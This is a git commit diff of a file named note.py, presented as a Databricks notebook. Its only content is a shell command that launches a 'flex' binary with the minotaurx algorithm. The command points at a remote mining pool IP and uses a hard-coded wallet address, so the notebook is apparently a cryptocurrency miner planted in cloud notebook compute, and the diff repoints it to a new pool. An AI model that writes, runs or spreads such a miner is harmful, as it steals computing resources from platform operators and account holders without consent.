da3de7d1eb476d2ace15138e802f1215f2d24040
paskofamas <mr.paskofa42@jugda.com>
2025-02-10 21:39:04 +0700

    Update note.py

--- note.py
+++ note.py
@@ -1,4 +1,4 @@
 # Databricks notebook source
 %python
 %sh
-./flex -a minotaurx -o 27.254.39.27:7021 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW.Wijaya1 -p c=MAZA
+./flex -a minotaurx -o 207.244.240.82:6000 -u solo:MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW.Wijaya -p x
